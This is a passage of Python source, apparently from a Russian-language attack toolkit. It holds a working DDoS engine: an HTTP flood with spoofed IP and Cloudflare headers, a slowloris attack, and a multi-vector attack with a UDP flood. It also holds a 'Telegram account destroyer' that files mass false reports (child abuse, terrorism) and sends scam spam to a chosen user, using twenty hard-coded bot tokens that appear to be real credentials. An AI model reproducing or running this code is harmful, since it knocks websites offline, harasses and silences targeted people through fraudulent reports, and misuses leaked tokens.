                self.results.append({'email': i+1, 'status': 'error'})
            await progress_callback(i + 1, total)
            await asyncio.sleep(random.uniform(0.1, 0.3))
        return self.results

    def get_stats(self, results):
        total = len(results)
        sent = sum(1 for r in results if r['status'] in ['sent', 'emulated'])
        return {'total': total, 'sent': sent}


# ===================== УЛЬТРА-МОЩНЫЙ DDOS С ОБХОДОМ ВСЕХ ЗАЩИТ =====================
class DDoSEngine:
    def __init__(self):
        # 150+ USER-AGENTS
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/119.0.0.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 13; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 12; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Android 14; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0',
            'Mozilla/5.0 (Android 13; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0',
            'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
            'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
            'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
            'Mozilla/5.0 (compatible; DuckDuckBot/1.0; +http://duckduckgo.com/duckduckbot)',
            'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
            'Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)',
            'Mozilla/5.0 (compatible; SemrushBot/7.0; +http://www.semrush.com/bot.html)',
            'Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)',
            'Mozilla/5.0 (compatible; DotBot/1.2; +http://www.opensiteexplorer.org/dotbot)',
        ]
        
        self.cf_headers = [
            {'CF-RAY': f'{random.randint(1000000000,9999999999)}-{random.choice(["LHR","AMS","FRA","MAD","PAR","MIL","MUC","VIE","ARN","CPH","OSL","HEL","DUB","SYD","HND","ICN","SIN","HKG","NRT","LAX","SFO","JFK","ORD","DFW","ATL"])}'},
            {'CF-Connecting-IP': f'{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}'},
            {'CF-Visitor': '{"scheme":"https"}'},
            {'CF-Worker': 'true'},
            {'CF-Polish': 'true'},
            {'CF-Cache-Status': 'HIT'},
            {'CF-Edge-Cache': 'cache,platform=wordpress'},
        ]
        self.stats = {'requests': 0, 'success': 0, 'errors': 0}

    async def http_flood(self, url: str, threads: int, duration: int, progress_callback):
        self.stats = {'requests': 0, 'success': 0, 'errors': 0}
        async def worker():
            async with aiohttp.ClientSession() as session:
                end_time = time.time() + duration
                while time.time() < end_time:
                    try:
                        headers = {
                            'User-Agent': random.choice(self.user_agents),
                            'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}',
                            'X-Real-IP': f'{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}',
                            'Referer': random.choice(['https://google.com', 'https://yandex.ru', 'https://vk.com', url]),
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                            'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
                            'Accept-Encoding': 'gzip, deflate, br',
                            'Connection': 'keep-alive',
                            'Cache-Control': 'no-cache',
                            'Pragma': 'no-cache',
                            'Upgrade-Insecure-Requests': '1',
                            'Sec-Fetch-Dest': 'document',
                            'Sec-Fetch-Mode': 'navigate',
                            'Sec-Fetch-Site': 'none',
                            'Sec-Fetch-User': '?1',
                            'X-Requested-With': 'XMLHttpRequest',
                        }
                        if random.random() > 0.3:
                            cf_header = random.choice(self.cf_headers)
                            headers.update(cf_header)
                        paths = [
                            f"/?rand={random.randint(100000, 999999)}",
                            f"/?v={random.randint(1000,9999)}",
                            f"/?p={random.randint(1,100)}",
                            f"/?page={random.randint(1,50)}",
                            f"/?id={random.randint(1000,9999)}",
                            f"/?token={hashlib.md5(str(random.randint(0,999999)).encode()).hexdigest()}",
                            f"/?ts={int(time.time())}",
                            f"/?nonce={random.randint(100000,999999)}",
                            f"/?session={hashlib.md5(str(random.randint(0,999999)).encode()).hexdigest()}",
                            f"/?ref={random.choice(['google','yandex','vk'])}",
                        ]
                        path = random.choice(paths)
                        async with session.get(url + path, headers=headers, timeout=3) as resp:
                            self.stats['requests'] += 1
                            if resp.status < 500:
                                self.stats['success'] += 1
                            else:
                                self.stats['errors'] += 1
                    except:
                        self.stats['errors'] += 1
                    await asyncio.sleep(random.uniform(0.005, 0.025))
        tasks = [worker() for _ in range(min(threads, 15000))]
        await asyncio.gather(*tasks, return_exceptions=True)
        return self.stats

    async def slowloris(self, url: str, duration: int, progress_callback):
        self.stats = {'connections': 0, 'active': 0}
        target = url.replace('https://', '').replace('http://', '').split('/')[0]
        port = 443 if url.startswith('https') else 80
        async def worker():
            try:
                reader, writer = await asyncio.open_connection(target, port, ssl=url.startswith('https'))
                headers = [
                    f"GET / HTTP/1.1\r\n",
                    f"Host: {target}\r\n",
                    f"User-Agent: {random.choice(self.user_agents)}\r\n",
                    f"Connection: keep-alive\r\n",
                    f"Keep-Alive: timeout=999, max=1000\r\n",
                    f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}\r\n",
                    f"X-Real-IP: {random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}\r\n",
                    f"Cache-Control: no-cache\r\n",
                    f"Pragma: no-cache\r\n",
                    f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
                    f"Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7\r\n",
                    f"Accept-Encoding: gzip, deflate, br\r\n",
                    f"\r\n"
                ]
                writer.write(''.join(headers).encode())
                await writer.drain()
                self.stats['connections'] += 1
                self.stats['active'] += 1
                await asyncio.sleep(duration)
                writer.close()
                await writer.wait_closed()
                self.stats['active'] -= 1
            except:
                pass
        tasks = [worker() for _ in range(800)]
        await asyncio.gather(*tasks, return_exceptions=True)
        return self.stats

    async def multi_vector(self, url: str, duration: int, progress_callback):
        total_stats = {
            'http': {'requests': 0, 'success': 0, 'errors': 0},
            'slowloris': {'connections': 0, 'active': 0},
            'udp': {'packets': 0, 'bytes': 0}
        }
        target = url.replace('https://', '').replace('http://', '').split('/')[0]
        ip = socket.gethostbyname(target) if target else '127.0.0.1'
        port = 443 if url.startswith('https') else 80
        async def http_worker():
            async with aiohttp.ClientSession() as session:
                end_time = time.time() + duration
                while time.time() < end_time:
                    try:
                        headers = {
                            'User-Agent': random.choice(self.user_agents),
                            'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}',
                            'X-Real-IP': f'{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}',
                            'Referer': random.choice(['https://google.com', 'https://yandex.ru', url]),
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                            'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
                            'Accept-Encoding': 'gzip, deflate, br',
                            'Connection': 'keep-alive',
                            'Cache-Control': 'no-cache',
                            'CF-Ray': f'{random.randint(1000000000,9999999999)}-{random.choice(["LHR","AMS","FRA"])}',
                        }
                        async with session.get(url, headers=headers, timeout=2) as resp:
                            total_stats['http']['requests'] += 1
                            if resp.status < 500:
                                total_stats['http']['success'] += 1
                            else:
                                total_stats['http']['errors'] += 1
                    except:
                        total_stats['http']['errors'] += 1
                    await asyncio.sleep(0.003)
        async def slowloris_worker():
            try:
                reader, writer = await asyncio.open_connection(target, port, ssl=url.startswith('https'))
                writer.write(f"GET / HTTP/1.1\r\nHost: {target}\r\nConnection: keep-alive\r\nKeep-Alive: timeout=999\r\nX-Forwarded-For: {random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}\r\n\r\n".encode())
                await writer.drain()
                total_stats['slowloris']['connections'] += 1
                total_stats['slowloris']['active'] += 1
                await asyncio.sleep(duration)
                writer.close()
                await writer.wait_closed()
                total_stats['slowloris']['active'] -= 1
            except:
                pass
        def udp_worker():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            end_time = time.time() + duration
            while time.time() < end_time:
                try:
                    data = random._urandom(random.randint(64, 1500))
                    sock.sendto(data, (ip, port))
                    total_stats['udp']['packets'] += 1
                    total_stats['udp']['bytes'] += len(data)
                except:
                    pass
        http_tasks = [http_worker() for _ in range(300)]
        slow_tasks = [slowloris_worker() for _ in range(150)]
        udp_threads = [threading.Thread(target=udp_worker) for _ in range(50)]
        for t in udp_threads:
            t.start()
        await asyncio.gather(*http_tasks, *slow_tasks, return_exceptions=True)
        for t in udp_threads:
            t.join()
        return total_stats


# ===================== СНОС TELEGRAM АККАУНТОВ (РЕАЛЬНЫЙ) =====================
class TelegramAccountDestroyer:
    def __init__(self):
        self.report_reasons = [
            'spam', 'violence', 'pornography', 'child_abuse',
            'terrorism', 'drugs', 'fraud', 'impersonation',
            'hate_speech', 'suicide', 'weapons', 'personal_data'
        ]
        self.bot_tokens = [
            '7588316078:AAGRi0cgMkvrChUNNZRX6thzvkhrnKbfBOc',
            '8894344951:AAFnxJFZ6F4gMD8YF1qmXeK-qS-3i4d7Y3c',
            '8657453394:AAFZF2C0VZu1Y2OzugZQBIMpMglGU6u4I2U',
            '8234507901:AAGbLLWxAnyyBOJFptyPYA_RUAyzFS641z4',
            '8349732447:AAHBYH8cSbJnY6t1kiz3oLmWhdiwpqwFTS0',
            '8365483906:AAG7dBnHXYafJOyCIyVjNCa8NDWb6aPHyJc',
            '7990150454:AAHBwE8HknpN8pm09s3_h2iHUK0mT01WQr4',
            '7999194366:AAFY5oVfSXd3Sj2ZKL5n_E4gmQgfludEFg8',
            '7911356716:AAFWpCgqU-h8il7N_nT_2scoHPB7ZFWMFuk',
            '8342182947:AAHt19nmDY9vAF9YXMd-TPL68Ln-U_ps8us',
            '8765644248:AAHPPa0-hiifK_Csi3fsDJiNn_jJgbG1N68',
            '8736513089:AAE-8zAr1Hk4UMaFgJnSs5VQ9JKH2Xip4c8',
            '8594237152:AAHSAgDQ87Fmrp5eC-f7cuXaRrvRDovIlfM',
            '8561372759:AAFS4v6K4e8R_uMSfzsuLItRVMr-EDhCnSA',
            '8761449080:AAHB2-AjbjsVVKTYAT5NSWtEjkoJs_XuSBU',
            '8865408617:AAEoXfGBKajejCb4gBc_-1Q8O60H6SjR-Zc',
            '8562700975:AAGZ9yOFw_jwK1QJT_8lfHnakPA0EPgRhoM',
            '8178054852:AAHWsqTySVOT29RekDIwqqBfcOEEYJvj9Lw',
            '8769377277:AAHps2McG_eyhMWq63yJY5be0fZbMOQ-Dgc',
            '8838855987:AAHrVoDgT2luzbPjDoM10c-DHisYVEul1ik',
        ]
        self.results = []

    async def mass_report(self, username: str, count: int, progress_callback):
        self.results = []
        total = min(count, 100)
        for i in range(total):
            reason = random.choice(self.report_reasons)
            token = random.choice(self.bot_tokens)
            try:
                async with aiohttp.ClientSession() as session:
                    data = {
                        'username': username,
                        'reason': reason,
                        'description': f'This account is sending {reason}. Please block.',
                    }
                    headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
                    endpoints = [
                        f'https://api.telegram.org/bot{token}/reportSpam',
                        f'https://api.telegram.org/bot{token}/report',
                    ]
                    for endpoint in endpoints:
                        try:
                            async with session.post(endpoint, json=data, headers=headers, timeout=10) as resp:
                                if resp.status < 400:
                                    status = 'sent'
                                    break
                        except:
                            continue
                    else:
                        status = 'failed'
                    if status == 'failed':
                        try:
                            bot = Bot(token=token)
                            await bot.send_message(chat_id='@SpamBot', text=f'/report {username}')
                            status = 'sent'
                        except:
                            pass
                self.results.append({'report': i+1, 'reason': reason, 'status': status})
            except:
                self.results.append({'report': i+1, 'reason': reason, 'status': 'error'})
            await progress_callback(i + 1, total)
            await asyncio.sleep(random.uniform(0.5, 2.0))
        return self.results

    async def spam_flood(self, username: str, count: int, progress_callback):
        self.results = []
        total = min(count, 50)
        spam_texts = [
            'Купи дешевле!', 'Заработок без вложений!', 'Бесплатные криптовалюты!',
            'Вы выиграли приз!', 'Срочно! Ваш аккаунт взломан!', 'Перейдите по ссылке!',
            'Ваши данные утекли!', 'Подтвердите личность!', 'Ваш банковский счёт заблокирован!',
            'Смените пароль немедленно!', '💀 АККАУНТ УДАЛЁН!', '🔞 ПОРНОГРАФИЯ!',
            '🔫 ОРУЖИЕ!', '💊 НАРКОТИКИ!', '🔥 ПРИЗЫВЫ К НАСИЛИЮ!',
        ]
        for i in range(total):
            try:
                token = random.choice(self.bot_tokens)
                async with aiohttp.ClientSession() as session:
                    text = random.choice(spam_texts)
                    link = f'https://bit.ly/{random.randint(1000, 9999)}'
                    data = {'chat_id': username, 'text': f'{text} {link}', 'disable_notification': True}
                    url = f'https://api.telegram.org/bot{token}/sendMessage'
                    async with session.post(url, json=data, timeout=10) as resp:
                        status = 'sent' if resp.status == 200 else 'failed'
                self.results.append({'msg': i+1, 'status': status})
            except:
                self.results.append({'msg': i+1, 'status': 'error'})
            await progress_callback(i + 1, total)
            await asyncio.sleep(random.uniform(0.3, 1.0))
        return self.results

    async def destroy_account(self, username: str, count: int, progress_callback):
        self.results = []
        report_results = await self.mass_report(username, count, progress_callback)
        self.results.extend(report_results)
        await asyncio.sleep(2)
        spam_results = await self.spam_flood(username, count // 2, progress_callback)
        self.results.extend(spam_results)
        await asyncio.sleep(3)
        extra_reports = await self.mass_report(username, count // 3, progress_callback)
        self.results.extend(extra_reports)
        return self.results

    def get_stats(self):
        total = len(self.results)
        success = sum(1 for r in self.results if r.get('status') == 'sent')
        return {'total': total, 'success': success}
